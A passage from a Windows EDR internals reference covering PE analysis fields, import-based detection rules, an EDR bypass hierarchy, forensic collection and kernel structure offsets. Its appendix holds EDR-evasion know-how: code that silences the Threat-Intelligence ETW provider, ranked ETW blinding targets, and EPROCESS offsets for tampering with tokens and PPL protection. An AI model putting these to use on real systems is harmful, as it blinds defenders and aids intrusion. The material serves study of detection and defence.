    FLOAT   MaxSectionEntropy;    // > 7.0 = packed/encrypted
    FLOAT   AvgSectionEntropy;
    BOOLEAN TextSectionEmpty;     // hollow process indicator
    
    // Overlay analysis
    ULONG64 OverlayOffset;        // data after last section
    ULONG64 OverlaySize;          // non-zero = appended data
    FLOAT   OverlayEntropy;       // high = encrypted payload appended
    
    // Signature
    BOOLEAN HasAuthenticode;      // Authenticode signature present
    BOOLEAN SignatureValid;        // signature cryptographically valid
    BOOLEAN SignerIsMicrosoft;
    BOOLEAN SignerInTrustDatabase;
    WCHAR   SignerSubject[256];
    BOOLEAN TimestampValid;        // countersignature timestamp
    BOOLEAN TimestampBeforeRevocation; // for revoked certs
    
    // Rich header (compilation artifacts)
    BOOLEAN HasRichHeader;
    ULONG   RichHeaderChecksum;   // can fingerprint toolchain
    
    // Debug info
    BOOLEAN HasDebugDirectory;
    WCHAR   OriginalPdbPath[MAX_PATH]; // PDB path (may leak build info)
    
    // Version info
    WCHAR   InternalName[256];
    WCHAR   OriginalFilename[256];
    WCHAR   FileVersion[64];
    WCHAR   CompanyName[256];
    
    // Anti-analysis
    BOOLEAN HasTlsCallbacks;      // TLS callbacks execute before entry point
    BOOLEAN HasBoundImports;
    ULONG   ResourceEntropy;      // high = may contain encrypted payload
} PE_ANALYSIS_RESULT;
```

### 53.2 Import Table Behavioral Scoring

```c
// Suspicious import combinations that EDR flags:
typedef struct _IMPORT_COMBINATION_RULE {
    const char *imports[MAX_COMBO_LEN];
    FLOAT       suspicionScore;
    const char *description;
} IMPORT_COMBINATION_RULE;

static const IMPORT_COMBINATION_RULE rules[] = {
    {
        {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"},
        0.85, "Classic process injection triad"
    },
    {
        {"OpenProcess", "ReadProcessMemory"},
        0.60, "Process memory reading"
    },
    {
        {"CryptEncrypt", "InternetOpenUrl", "CreateFile"},
        0.75, "Ransomware pattern: encrypt and possibly exfiltrate"
    },
    {
        {"NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"},
        0.90, "Native API injection (bypasses Win32 hooks)"
    },
    {
        {"SetWindowsHookEx", "GetAsyncKeyState"},
        0.80, "Keylogger pattern"
    },
    {
        {"FindFirstFile", "CryptEncrypt", "DeleteFile"},
        0.85, "Ransomware enumeration+encrypt+delete"
    },
    {
        {"MiniDumpWriteDump"},
        0.95, "LSASS/process dump capability"
    },
    {
        {"NetShareEnum", "WNetOpenEnum"},
        0.65, "Network share enumeration (lateral movement recon)"
    }
};
```

### 53.3 Section Entropy as Packing Indicator

```python
# Shannon entropy calculation for PE section analysis
import math

def section_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    entropy = 0.0
    length = len(data)
    for f in freq:
        if f > 0:
            p = f / length
            entropy -= p * math.log2(p)
    return entropy

# Interpretation:
# 0.0 - 1.0: constant/sparse data (near-empty section)
# 1.0 - 5.0: typical code or data
# 5.0 - 7.0: moderate randomness (compressed data, some encryption)
# 7.0 - 7.5: high entropy (compressed executable, some packers)
# 7.5 - 8.0: very high (encrypted payload, strong packers like UPX with encryption)
# Max possible: 8.0 (perfectly random bytes)

# EDR thresholds:
# .text section entropy > 7.0 → PACKED_EXECUTABLE
# .rdata section entropy > 7.0 → ENCRYPTED_STRINGS (config obfuscation)
# .rsrc section entropy > 7.5 → ENCRYPTED_RESOURCE_PAYLOAD
```

---

## SECTION 54: The Complete EDR Bypass Hierarchy

### 54.1 Layered Bypass Framework

Understanding bypass hierarchy helps both defenders and researchers understand the threat model:

```
Level 0: No bypass (standard attacker)
  → Caught by: AMSI, file signature, behavioral hooks
  → Examples: Script kiddies, known public malware

Level 1: User-mode hook bypass (intermediate)
  → Technique: ntdll unhooking, direct syscalls
  → Caught by: ETW-TI (kernel emission), Nirvana callback, trap frame
  → Examples: Hell's Gate, Halo's Gate, most modern C2 frameworks

Level 2: ETW-TI bypass (advanced)
  → Technique: Patch ETW provider flags (requires kernel access)
  → Requires: BYOVD or kernel exploit
  → Caught by: minifilter still sees I/O, process callbacks still fire,
              ETW-TI monitoring from second EDR or cloud correlation
  → Examples: Lazarus FudModule, EDRSandblast partial

Level 3: Callback removal (expert)
  → Technique: BYOVD removes PspCreateProcessNotifyRoutine entries,
              unlinks minifilter callback nodes, zeroes OB callbacks
  → Requires: BYOVD + stable kernel offsets (PDB or brute force)
  → Caught by: EDR re-registration on heartbeat, cloud gap detection,
              HVCI prevents code injection but not data modification
  → Examples: EDRSandblast full, custom BYOVD tooling

Level 4: Hypervisor-level
  → Technique: UEFI implant, pre-boot rootkit, VT-x root modification
  → Requires: Physical access or UEFI vulnerability
  → Caught by: Secure Boot (if not bypassed), TPM attestation
  → Examples: APT firmware implants, LoJax, MosaicRegressor

Level 5: Hardware
  → Technique: DMA attack (PCIe/Thunderbolt), hardware implant
  → Requires: Physical access
  → Caught by: IOMMU (VT-d), Thunderbolt security levels
  → Examples: Computrace/LoJax hardware equivalents, NSA hardware implants
```

### 54.2 What Cannot Be Bypassed Without Physical Access

```
Unbypassable controls (software-only attacker):
  1. UEFI Secure Boot (validates boot chain from firmware)
  2. TPM-based attestation (measures PCR values, detects tampering)
  3. HVCI + VTL1 Secure Kernel (hypervisor enforces W^X on kernel memory)
  4. Hardware CET Shadow Stack (CPU-enforced, cannot be disabled from user-mode)
  5. Intel TDT PMU monitoring (hardware-level behavior sensors)
  6. IOMMU (prevents DMA attacks from peripherals)
  
What IS bypassable with BYOVD (ring-0 arbitrary write):
  → Kernel callbacks (data-only modification)
  → ETW-TI provider flags
  → EPROCESS protection fields
  → Minifilter instance unlinking
  → User-mode ntdll hooks (trivially)
  
What HVCI adds to the story:
  → Code injection still blocked (hypervisor W^X)
  → Data-only BYOVD still works
  → Closing the gap: Microsoft adding VTL1-backed protection for specific EPROCESS fields
  → Future direction: VTL1 protecting all critical kernel data structures
```

---

## SECTION 55: Forensic Acquisition Capabilities

### 55.1 EDR as Forensic Collection Platform

Modern EDRs are not just detection systems — they're **forensic acquisition platforms** with the ability to collect artifacts on-demand:

```
Investigation Package Contents (auto-collected on alert trigger):
  ┌─────────────────────────────────────────────────────────────┐
  │  Process artifacts:                                         │
  │    → Running process list (PID, image, cmdline, parent)    │
  │    → Process memory dumps (targeted, on alert)             │
  │    → Module list per process (in-memory vs disk mismatch)  │
  │    → Handle list per process                               │
  │    → Thread stacks per process                             │
  │                                                            │
  │  Network artifacts:                                         │
  │    → Active connections (local/remote addr, PID)           │
  │    → Recent DNS queries (from ETW DNS provider)            │
  │    → Open ports                                            │
  │                                                            │
  │  File artifacts:                                            │
  │    → Recently created/modified executables                 │
  │    → Suspicious file paths (temp, appdata, %public%)       │
  │    → Deleted files (from USN journal, if not overwritten)  │
  │    → File hashes (MD5, SHA1, SHA256)                       │
  │                                                            │
  │  Registry artifacts:                                        │
  │    → Auto-run locations (Run, RunOnce, Services, Tasks)    │
  │    → WMI subscriptions (persistence via WMI)               │
  │    → ShimDatabase entries                                   │
  │                                                            │
  │  Event log artifacts:                                       │
  │    → Last 72h of Security, System, Application logs        │
  │    → PowerShell/Operational script blocks                  │
  │    → Sysmon equivalent events                              │
  │                                                            │
  │  Memory artifacts:                                          │
  │    → Full memory image (on critical alerts or request)     │
  │    → Kernel pool tags scan (looking for malware pool tags) │
  │    → SSDT verification (should match baseline)             │
  └─────────────────────────────────────────────────────────────┘
```

### 55.2 Live Memory Acquisition

```c
// EDR kernel driver can acquire process memory:
NTSTATUS AcquireProcessMemory(PEPROCESS TargetProcess, 
                               PVOID OutputBuffer, SIZE_T BufferSize) {
    // Attach to target process address space
    KAPC_STATE apcState;
    KeStackAttachProcess(TargetProcess, &apcState);
    
    // Walk VAD tree to enumerate all committed regions
    PMMVAD_SHORT vad = GetVadRoot(TargetProcess);
    WalkVadTree(vad, [](PMMVAD_SHORT node) {
        PVOID base = VadNodeStart(node);
        SIZE_T size = VadNodeSize(node);
        ULONG type = GetVadType(node);
        
        // Read each committed page
        ReadKernelMemory(base, size, OutputBuffer + currentOffset);
    });
    
    KeUnstackDetachProcess(&apcState);
    return STATUS_SUCCESS;
}
```

---

## SECTION 56: Emerging Threats and Future EDR Challenges

### 56.1 AI-Generated Polymorphic Malware

The intersection of LLMs and malware:

```
Current state (2025-2026):
  → LLM-assisted malware variants (rewriting existing malware in new styles)
  → AI-generated phishing (highly targeted, grammatically perfect)
  → AI-assisted vulnerability discovery (automated fuzzing + LLM analysis)

Challenge for EDR:
  → Signature-based detection fails: every sample is unique
  → Behavioral detection: core behavior unchanged (injection is injection)
  → LLM-mutated code still performs the same API calls → ETW-TI catches
  → Obfuscation changes: more creative, harder for static analysis

EDR adaptation:
  → LLM-based malware analysis (counter-LLM)
  → Foundation models for code understanding (not just pattern matching)
  → Semantic understanding of script content (AMSI + LLM)
  → Intent classification: "does this code intend to exfiltrate?"
```

### 56.2 Kernel-Level AI Inference

```
Emerging: EDR running ML inference in kernel mode:
  → Reduced latency (no user-kernel boundary crossing)
  → Atomic decision (kernel event + ML verdict in single callback)
  → Requires: efficient ML runtime in kernel space
  → Challenges: kernel memory constraints, no GPU access, stability
  
Current state: ML at user-mode sensor or cloud
  → Kernel: fast, rule-based decisions only
  → User-mode: ML inference on batched events
  → Cloud: deep ML analysis on full behavioral graph
  
Future: 
  → Small, compiled models in kernel (decision trees, linear models)
  → NPU (Neural Processing Unit) with DMA-accessible inference
  → Hardware ML accelerators integrated with PMU (Intel TDT evolution)
```

### 56.3 The eBPF Convergence on Windows

Microsoft announced eBPF-for-Windows project:
- Run eBPF programs on Windows using LLVM-compiled BPF bytecode
- Verified by Windows eBPF verifier
- Can attach to Windows network stack (WFP), sockets, processes
- Potential for unified eBPF-based security monitoring across Linux and Windows

**EDR implications:**
- Single eBPF monitoring code for Windows + Linux endpoints
- Reduced development overhead for cross-platform EDR
- Same evasion techniques as Linux eBPF (limited by kernel verifier)
- No kernel module/driver signing requirement for eBPF programs (lower attack surface)

### 56.4 Confidential Computing and EDR Blind Spots

```
Intel TDX (Trust Domain Extensions) / AMD SEV-SNP:
  → Creates hardware-encrypted VM (Trust Domain) 
  → Host hypervisor CANNOT read guest memory (encrypted by CPU)
  → EDR running in host: completely blind to workloads inside TDX
  → Cloud-native threat: containerized workloads in TDX = invisible to host EDR

Challenge:
  → Legitimate use: protect sensitive cloud workloads from hypervisor
  → Malicious use: run C2 server inside TDX VM, undetectable by host
  
Current mitigations:
  → TDX cannot initiate network connections without host knowledge (WFP at host level)
  → Network-level EDR (NDR) can see traffic even from TDX VMs
  → TDX attestation: guest must prove its identity to connect externally
  
Future challenge:
  → If TDX network traffic becomes encrypted end-to-end
  → NDR loses content visibility → behavioral analysis only
  → Challenge similar to TLS inspection today, but at hypervisor layer
```

---

## APPENDIX: Precise Kernel Structure Offsets Reference

*Reference data from Vergilius Project, Geoff Chappell's Windows Internals, and Microsoft PDB symbols. Offsets for x64 Windows 10/11.*

## 1. ETW Internal Structures

### 1.1 _WMI_LOGGER_CONTEXT

The `_WMI_LOGGER_CONTEXT` is the kernel's internal representation of a single ETW trace
session. Microsoft does not document it; its layout is reconstructed from public PDB symbols.
The structure has grown substantially across versions — from 0x0238 bytes (x64, 6.1/Win7)
to 0x0990 bytes (x64, build 1709) and stabilized around 0x0550 bytes (x64, build 2004/20H1).

**Key fields (x64 offsets, Windows 10 2004 / approx. 0x0550 total):**

```
+0x000 LoggerId              : ULONG          // Index into EtwpLoggerContext[]; bits[0..15]
+0x004 BufferSize            : ULONG          // Bytes per event buffer
+0x008 MaximumEventSize      : ULONG
+0x00C LoggerMode            : ULONG          // EVENT_TRACE_REAL_TIME_MODE etc.
+0x010 AcceptNewEvents       : LONG           // Interlocked flag; 0 = session disabled
+0x018 GetCpuClock           : ULONG          // Index (0-3): 0=RtlGetSystemTimePrecise,
                                              //  1=KeQueryPerformanceCounter,
                                              //  2=HalTimerQueryHostPerformanceCounter,
                                              //  3=__rdtsc
                                              // (Was a function pointer before MS patched
                                              //  InfinityHook by converting it to an index)
+0x020 LoggerThread          : ETHREAD*
+0x028 LoggerStatus          : NTSTATUS
+0x030 (buffer queue structures)
+0x098 LoggerName            : UNICODE_STRING  // e.g. L"NT Kernel Logger"
+0x0C0 BuffersAvailable      : LONG volatile
+0x0D8 ClockType             : ULONG          // 0=Raw,1=PerfCounter,2=SystemTime,3=CpuCycle
+0x0E0 FlushTimer            : ULONG
+0x218 LoggerMutex           : KMUTANT
+0x290 LoggerLock            : EX_PUSH_LOCK
+0x2B8 BufferListSpinLock    : EX_PUSH_LOCK
+0x2C0 ClientSecurityContext : SECURITY_CLIENT_CONTEXT
+0x2E0 SecurityDescriptor    : EX_FAST_REF
+0x318 TokenAccessInformation: TOKEN_ACCESS_INFO*
+0x320 StartTime             : LARGE_INTEGER
+0x330 Flags                 : ULONG          // bit 14 = SecurityTrace (PPL-only sessions)
       SecurityTrace          : Pos 14, 1 bit
```

**Size evolution (x64):**

| Build    | x64 Size |
|----------|----------|
| Win7/6.1 | 0x0330   |
| Win8/6.2 | 0x0378   |
| Win10 RTM| 0x0398   |
| 1709     | 0x0990   |
| 1809     | 0x0520   |
| 2004     | 0x0550   |
| 11 24H2  | 0x0650   |

**SecurityTrace flag (bit 14 of Flags @ +0x330):**
Only `DefenderApiLogger` and `DefenderAuditLogger` sessions have this bit set by default.
Queries against such a session via `EtwpQueryTrace` require the caller to hold
Antimalware-PPL signing level (`PsProtectedSignerAntimalware`). This bit can also be set by
writing to the `EnableSecurityProvider` AutoLogger registry value.

**InfinityHook (legacy) and GetCpuClock:**
The original InfinityHook exploit replaced the `GetCpuClock` function pointer to intercept
every system call. Microsoft mitigated this by converting the field from a raw pointer to an
integer index (0–3), breaking the exploit.

**Session access path:**

```
nt!PspHostSiloGlobals
  -> EtwSiloState  (_ETW_SILODRIVERSTATE*)
    -> EtwpLoggerContext  (WMI_LOGGER_CONTEXT** array[64])
      -> [LoggerId]  = pointer to _WMI_LOGGER_CONTEXT for session N
```

Sessions 0–63 are tracked; unused slots contain sentinel value `1`.

---

### 1.2 _ETW_GUID_ENTRY

One `_ETW_GUID_ENTRY` per registered provider GUID (per silo). Stored in a 64-bucket hash
table (`EtwpGuidHashTable`) within `_ETW_SILODRIVERSTATE`. Each bucket is a list of entries
split by GUID type: `EtwpTraceGuidType`, `EtwpNotificationGuidType`, `EtwpGroupGuidType`.

**x64 offsets (Windows 10 2004+):**

```
+0x000 GuidList              : LIST_ENTRY         // Linkage in hash bucket
+0x010 SiloGuidList          : LIST_ENTRY         // (2004+) per-silo linkage
+0x020 RefCount              : LONG_PTR volatile
+0x028 Guid                  : GUID               // 16 bytes
+0x038 RegListHead           : LIST_ENTRY         // Head of ETW_REG_ENTRY list
+0x048 SecurityDescriptor    : PSECURITY_DESCRIPTOR
+0x050 LastEnable / MatchId  : union
+0x060 ProviderEnableInfo    : TRACE_ENABLE_INFO  // Summary enable state for the provider
+0x080 EnableInfo[8]         : TRACE_ENABLE_INFO  // Per-session enable info (max 8 sessions)
+0x180 FilterData            : ETW_FILTER_HEADER*
+0x190 HostEntry             : ETW_GUID_ENTRY*
+0x198 Lock                  : EX_PUSH_LOCK
+0x1A0 LockOwner             : ETHREAD*
```

**TRACE_ENABLE_INFO layout:**
```c
typedef struct _TRACE_ENABLE_INFO {
    ULONG  IsEnabled;        // Non-zero = at least one session has enabled this provider
    UCHAR  Level;
    UCHAR  Reserved1;
    USHORT LoggerId;         // Which session index
    ULONG  EnableProperty;
    ULONG  Reserved2;
    ULONGLONG MatchAnyKeyword;
    ULONGLONG MatchAllKeyword;
} TRACE_ENABLE_INFO;        // 0x20 bytes
```

The `ProviderEnableInfo.IsEnabled` field is checked by `nt!EtwEventEnabled` before
emitting any event. If zeroed, event emission is short-circuited entirely.

---

### 1.3 _ETW_REG_ENTRY

One instance per `EtwRegister()` call. Multiple registrations of the same GUID share one
`ETW_GUID_ENTRY`, with all `ETW_REG_ENTRY` instances linked via `RegList` into
`GuidEntry->RegListHead`.

**x64 offsets (Windows 10 2004+), total 0x70 bytes:**

```
+0x000 RegList               : LIST_ENTRY         // Linkage under GuidEntry->RegListHead
+0x010 GroupRegList          : LIST_ENTRY         // Provider group list
+0x020 GuidEntry             : ETW_GUID_ENTRY*    // Parent GUID entry
+0x028 GroupEntry            : ETW_GUID_ENTRY*    // Group GUID entry (Win10+)
+0x030 ReplyQueue            : ETW_REPLY_QUEUE*
+0x050 Process               : EPROCESS*          // OR callback pair for kernel providers
+0x060 Index                 : USHORT             // Registration index
+0x062 Flags                 : USHORT             // Bit field
+0x064 EnableMask            : UCHAR              // Bit per session (max 8 sessions)
+0x065 GroupEnableMask       : UCHAR
+0x066 HostEnableMask        : UCHAR
+0x067 HostGroupEnableMask   : UCHAR
+0x068 Traits                : ETW_PROVIDER_TRAITS*
```

**EnableMask semantics:**
Each bit position N in `EnableMask` corresponds to logger session N being active for this
registration. All four mask fields (`EnableMask`, `GroupEnableMask`, `HostEnableMask`,
`HostGroupEnableMask`) must be zeroed to fully silence a provider. This is what the
Lazarus FudModule rootkit did to disable 95 providers.

---

### 1.4 EtwRegister — kernel provider registration path

```
EtwRegister(ProviderGuid, Callback, Context, &RegHandle)
  -> EtwpBuildEtwRegistration()
     1. Lock EtwpGuidHashTable[hash(GUID) & 0x3F]
     2. Search for existing ETW_GUID_ENTRY matching GUID
        - If none: allocate + insert new ETW_GUID_ENTRY
     3. Allocate ETW_REG_ENTRY; link into GuidEntry->RegListHead
     4. If provider already enabled in active sessions:
        - Callback fires immediately (EnableCallback invocation)
     5. Return &ETW_REG_ENTRY as RegHandle (since Win8; was index before)
```

---

### 1.5 EtwpNotifyGuid

`EtwpNotifyGuid` is called when a provider's enable state changes (e.g. a session starts or
stops, or a session changes level/keyword). It:

1. Locates the `ETW_GUID_ENTRY` by GUID.
2. Rebuilds `ProviderEnableInfo` by ORing across all `EnableInfo[N]` entries.
3. Updates `EnableMask` in each `ETW_REG_ENTRY` under `RegListHead`.
4. Invokes each registration's `EnableCallback` (the `PENABLECALLBACK` passed to
   `EtwRegister`) on the EPROCESS of the registered kernel component.

---

### 1.6 EtwpActiveSystemLoggers and _ETW_SILODRIVERSTATE

`EtwpActiveSystemLoggers` is a bitmask (ULONG) where bit N = 1 means logger session N is
active. Used in `EtwpLogKernelEvent` as a guard: if the bit for a session is clear, no
event is logged to it.

Access path from within the kernel:

```
nt!EtwpHostSiloState  (exported or resolved via pattern scan)
  -> _ETW_SILODRIVERSTATE
```

**_ETW_SILODRIVERSTATE key fields (x64, Windows 10 1809–2004, ~0x1220 bytes):**

```
+0x000 EtwpSecurityProviderGuidEntry : ETW_GUID_ENTRY*
+0x018 (security-related fields)
+0x1C8 EtwpLoggerContext             : WMI_LOGGER_CONTEXT** (pointer to array)
+0x1D0 EtwpGuidHashTable[0x40]       : ETW_HASH_BUCKET array
+0x??? EtwpActiveSystemLoggers       : ULONG (within SystemLoggerSettings sub-struct)
```

Note: The exact offset of `EtwpActiveSystemLoggers` is build-specific. The Lazarus rootkit
resolves it by scanning for opcode patterns in `EtwTraceKernelEvent` or by following the
`EtwSendTraceBuffer` → `EtwpHostSiloState` reference chain, then adding a hardcoded
per-build delta.

**Zeroing `EtwpActiveSystemLoggers` effect:**
`EtwpLogKernelEvent` uses `bsf` (bit scan forward) to find the first active session. If the
bitmask is 0, the loop never runs, and no events are logged — a complete blackout of all
kernel ETW events.

---

### 1.7 EtwThreatIntProvRegHandle

Global variable in ntoskrnl data section:
```
nt!EtwThreatIntProvRegHandle  -> ETW_REG_ENTRY*
```

Provider GUID: `F4E1897C-BB5D-5668-F1D8-040F4D8DD344`
(`Microsoft-Windows-Threat-Intelligence`)

To disable this provider from kernel mode:

```c
ETW_REG_ENTRY* reg = *(ETW_REG_ENTRY**)EtwThreatIntProvRegHandle;
ETW_GUID_ENTRY* guid = reg->GuidEntry;
// Zero ProviderEnableInfo
guid->ProviderEnableInfo.IsEnabled = 0;
// Walk RegListHead and zero all masks
LIST_ENTRY* head = &guid->RegListHead;
for (LIST_ENTRY* e = head->Flink; e != head; e = e->Flink) {
    ETW_REG_ENTRY* r = CONTAINING_RECORD(e, ETW_REG_ENTRY, RegList);
    r->EnableMask = 0;
    r->GroupEnableMask = 0;
    r->HostEnableMask = 0;
    r->HostGroupEnableMask = 0;
}
```

This makes `nt!EtwEventEnabled` return FALSE for all TI provider events, suppressing
ReadFile, WriteFile, VirtualAlloc, CreateProcess, etc. telemetry from the TI channel.

---

### 1.8 ProviderEnableInfo / EnableMask check before event emission

```
EtwWrite / EtwEventWrite
  -> EtwEventEnabled(RegHandle, EventDescriptor)
       1. reg = (ETW_REG_ENTRY*)RegHandle
       2. if reg->GuidEntry->ProviderEnableInfo.IsEnabled == 0: return FALSE
       3. Walk EnableInfo[0..7]: check Level, MatchAnyKeyword, MatchAllKeyword
       4. Check GroupEnableMask for group sessions
     -> if any check fails: return FALSE, event is dropped silently
```

Attacker bypass targets in order of surgical precision:
- Zeroing `ProviderEnableInfo.IsEnabled` in `ETW_GUID_ENTRY` (most targeted)
- Zeroing `EnableMask`/`GroupEnableMask` in `ETW_REG_ENTRY` (per-registration)
- Zeroing `EtwpActiveSystemLoggers` (nuclear — kills all kernel ETW)
- Patching `AcceptNewEvents = 0` in `WMI_LOGGER_CONTEXT` (kills a specific session)

---

## 2. EPROCESS Exact Field Offsets

### 2.1 Multi-version offset table (x64)

The `_EPROCESS` (Executive Process) structure layout changes between Windows builds. Key
security-relevant fields:

| Field                        | Win10 1909 | Win10 2004/21H2/22H2 | Win11 22H2 | Win11 24H2 |
|------------------------------|------------|----------------------|------------|------------|
| `UniqueProcessId`            | 0x2E8      | 0x440                | 0x440      | 0x1D0      |
| `ActiveProcessLinks`         | 0x2F0      | 0x448                | 0x448      | 0x1D8      |
| `Token` (EX_FAST_REF)        | 0x360      | 0x4B8                | 0x4B8      | 0x248      |
| `Protection` (PS_PROTECTION) | 0x6FA      | 0x87A                | 0x87A      | 0x5FA      |
| `Flags` (ULONG)              | 0x30C      | 0x464                | 0x464      | 0x1F4      |
| `Flags2` (ULONG)             | 0x308      | 0x460                | 0x460      | 0x1F0      |
| `Flags3` (ULONG)             | 0x6FC      | 0x87C                | 0x87C      | 0x5FC      |
| `VadRoot` (RTL_AVL_TREE)     | 0x658      | 0x7D8                | 0x7D8      | 0x558      |
| `InheritedFromUniqueProcessId`| 0x3E8     | 0x540                | 0x540      | 0x2D0      |
| `MitigationFlags`            | 0x850      | 0x9D0                | 0x9D0      | 0x750      |
| `MitigationFlags2`           | 0x854      | 0x9D4                | 0x9D4      | 0x754      |
| Total sizeof(_EPROCESS)      | 0x880      | 0xB80                | 0xB80      | 0x840      |

Notes:
- Win10 versions 2004, 20H2, 21H1, 21H2, 22H2 share the same offsets for the fields above.
- Windows 11 24H2 (build 26100) significantly reorganized the structure, shrinking it.
- `SignalState` is a field of `_KPROCESS` (the embedded dispatcher header at offset 0x0),
  not directly in `_EPROCESS`; it is at `EPROCESS+0x004` (within `Pcb.Header.SignalState`).

---

### 2.2 Calculating offsets programmatically from PDB

**Method: Runtime PDB symbol resolution (no kernel driver required):**

```cpp
// Step 1: Get ntoskrnl.exe kernel base + disk path
SYSTEM_MODULE_INFORMATION modules = {};
NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0xB,  // SystemModuleInformation
    &modules, sizeof(modules), nullptr);
// modules[0] is always ntoskrnl.exe
PVOID kernelBase = modules.Module[0].ImageBase;
char*  kernelPath = modules.Module[0].FullPathName;

// Step 2: Extract PDB GUID from Debug Directory
IMAGE_DOS_HEADER*  dos = (IMAGE_DOS_HEADER*)LoadLibraryExA(kernelPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
IMAGE_NT_HEADERS*  nt  = RVA(dos, dos->e_lfanew);
IMAGE_DEBUG_DIRECTORY* dbg = RVA(dos, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress);
// dbg->Type == IMAGE_DEBUG_TYPE_CODEVIEW -> RSDS record
struct RSDS { DWORD sig; GUID guid; DWORD age; char pdbName[]; }* rsds = RVA(dos, dbg->AddressOfRawData);

// Step 3: Download PDB from Microsoft symbol server
// URL format: https://msdl.microsoft.com/download/symbols/ntoskrnl.pdb/<GUID_NO_DASHES><Age>/ntoskrnl.pdb
// Use WinHTTP to fetch; cache locally.

// Step 4: Load PDB with DbgHelp and enumerate _EPROCESS children
HANDLE hSym = (HANDLE)0xBEEF;
SymInitialize(hSym, nullptr, FALSE);
SymLoadModuleExW(hSym, nullptr, L"ntoskrnl.pdb", nullptr, 0x10000000, 0, nullptr, 0);

// Step 5: Resolve field offset
DWORD tokenOffset = GetFieldOffset(hSym, L"_EPROCESS", L"Token");
// tokenOffset + kernelBase = absolute kernel address of Token field in any EPROCESS
```

**Alternative: NtQuerySystemInformation + exported symbols**
`PsInitialSystemProcess` is exported by ntoskrnl. The EPROCESS of the System process can
be read from it; then `Token` offset can be found by scanning for the SYSTEM process's
well-known token value.

---

### 2.3 PS_PROTECTION (EPROCESS.Protection)

Single byte at offset noted above. Bit layout:

```c
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;   // PsProtectedType enum
            UCHAR Audit  : 1;   // Reserved; if set, logs instead of blocks
            UCHAR Signer : 4;   // PsProtectedSigner enum
        };
    };
} PS_PROTECTION;
```

**PS_PROTECTED_TYPE enum:**
| Value | Name |
|-------|------|
| 0     | PsProtectedTypeNone |
| 1     | PsProtectedTypeProtectedLight (PPL) |
| 2     | PsProtectedTypeProtected (PP) |

**PS_PROTECTED_SIGNER enum (bits 4-7):**
| Value | Name |
|-------|------|
| 0     | PsProtectedSignerNone |
| 1     | PsProtectedSignerAuthenticode |
| 2     | PsProtectedSignerCodeGen |
| 3     | PsProtectedSignerAntimalware |
| 4     | PsProtectedSignerLsa |
| 5     | PsProtectedSignerWindows |
| 6     | PsProtectedSignerWinTcb |
| 7     | PsProtectedSignerWinSystem |
| 8     | PsProtectedSignerApp |

**LSASS with PPL:** `Protection = 0x41` = Type:1 (PPL), Signer:4 (Lsa).

Higher signer value → can open handles to lower-signer PPL processes, but not vice versa.
Modifying `Protection` via DKOM (e.g. zeroing it) removes PPL restriction on the process.

---

### 2.4 MitigationFlags and MitigationFlags2

Both are ULONG bit-fields. Present since Windows 10 1709 (consolidated from Flags/Flags2).

**MitigationFlags (offset varies by build — see table above):**
```
Bit  0  ControlFlowGuardEnabled
Bit  1  ControlFlowGuardExportSuppressionEnabled
Bit  2  ControlFlowGuardStrict
Bit  3  DisallowStrippedImages
Bit  4  ForceRelocateImages
Bit  5  HighEntropyASLREnabled
Bit  6  StackRandomizationDisabled
Bit  8  DisableDynamicCode           (0x100)
Bit 12  DisallowWin32kSystemCalls    (0x1000)
Bit 26  LoaderIntegrityContinuityEnabled (0x04000000)
Bit 30  RestrictIndirectBranchPrediction (0x40000000, 1809+)
Bit 31  IsolateSecurityDomain        (0x80000000, 1809+)
```

**MitigationFlags2 (offset = MitigationFlags + 4):**
```
Bit  0  EnableExportAddressFilter
Bit  1  AuditExportAddressFilter
Bit  2  EnableExportAddressFilterPlus
Bit  7  UserCetSetContextIpValidation        // CET RIP validation
Bit  8  UserCetSetContextIpValidationAudit
Bit  9  RestrictCoreSharing
Bit 10  DisallowFrontendUserInput
Bit 11  AllowLowPrivilegeHandleTable
```

---

## 3. CET (Control-flow Enforcement Technology) and Shadow Stacks

### 3.1 Intel CET shadow stack at CPU level

CET is a hardware feature providing:
1. **Shadow Stack (SHSTK)**: A second, CPU-protected stack that stores only return addresses.
   On `CALL`, hardware pushes the return address to both the regular stack and shadow stack.
   On `RET`, hardware checks that the address on the regular stack matches the shadow stack
   top; mismatch raises `#CP` (Control Protection exception, vector 21).
2. **Indirect Branch Tracking (IBT)**: Requires valid targets of indirect branches (`JMP`/`CALL`)
   to be preceded by `ENDBR64`/`ENDBR32` instructions. **Windows does not implement IBT** —
   it uses CFG (Control Flow Guard) instead.

**CPU MSRs:**
```
IA32_U_CET       (0x6A0)  — user-mode CET config: SHSTK_EN (bit 0), ENDBR_EN (bit 2)
IA32_PL3_SSP     (0x6A7)  — user-mode shadow stack pointer (ring-3 SSP)
IA32_S_CET       (0x6A2)  — supervisor CET config
IA32_PL0_SSP     (0x6A4)  — ring-0 SSP
```

Shadow stack pointer is 8-byte aligned. The shadow stack region is allocated with
`PAGE_GUARD | PAGE_TARGETS_INVALID` protections — it is readable but not directly writable
from user mode.

### 3.2 CETCOMPAT bit in PE

The CETCOMPAT flag is set in the PE `IMAGE_LOAD_CONFIG_DIRECTORY` at
`DllCharacteristicsEx` bit 0 (`IMAGE_DLLCHARACTERISTICS_EX_CET_COMPAT`).
Compiled with `/CETCOMPAT` (MSVC) or equivalent.

All in-box 64-bit Windows DLLs are CETCOMPAT. If any loaded DLL in a process lacks it,
the OS can run in "compatibility mode" (CET enabled but strict enforcement disabled for
that module) or strict mode (process immediately terminated on mismatch).

**Compatibility vs Strict:**
- Compatibility: non-CETCOMPAT DLLs allowed; violations raise `#CP` but are handled gracefully.
- Strict: all loaded code must be CETCOMPAT; enforced via `MitigationFlags2.UserCetSetContextIpValidation`.

### 3.3 Shadow Stack Pointer (SSP) and XState

The SSP is per-thread. It is stored in the extended state (XState) via:
- **XSTATE_CET_U (bit 11)**: User-mode CET state → contains `Ia32CetUMsr` and `Ia32Pl3SspMsr`.
- **XSTATE_CET_S (bit 12)**: Kernel-mode CET state.

On context switch, `XSAVE`/`XRSTOR` saves/restores all CET state through the `CONTEXT_EX`
extended block. The `CONTEXT_EX` structure extends the legacy `CONTEXT` for XState data.

